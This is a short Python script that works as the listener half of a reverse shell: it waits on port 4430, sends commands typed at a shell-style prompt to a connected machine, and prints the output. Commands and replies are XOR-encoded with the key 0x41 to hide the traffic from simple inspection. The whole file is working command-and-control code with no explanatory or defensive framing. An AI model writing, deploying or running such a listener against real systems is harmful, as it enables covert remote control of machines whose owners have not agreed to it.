#!/usr/bin/python3
__author__ = 'Administrator'
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 4430))
s.listen(2048)
print("Listening on port 4430... ")
(client, (ip, port)) = s.accept()
print(" recived connection from : {}", ip)
while True:
    command = input('~$ ')
    encode = bytearray(command, 'utf-8')
    for i in range(len(encode)):
        encode[i] ^= 0x41
    client.send(encode)
    en_data = client.recv(2048)
    decode = bytearray(en_data)
    for i in range(len(decode)):
        decode[i] ^= 0x41
    print(decode.decode('utf-8'))
client.close()
s.close()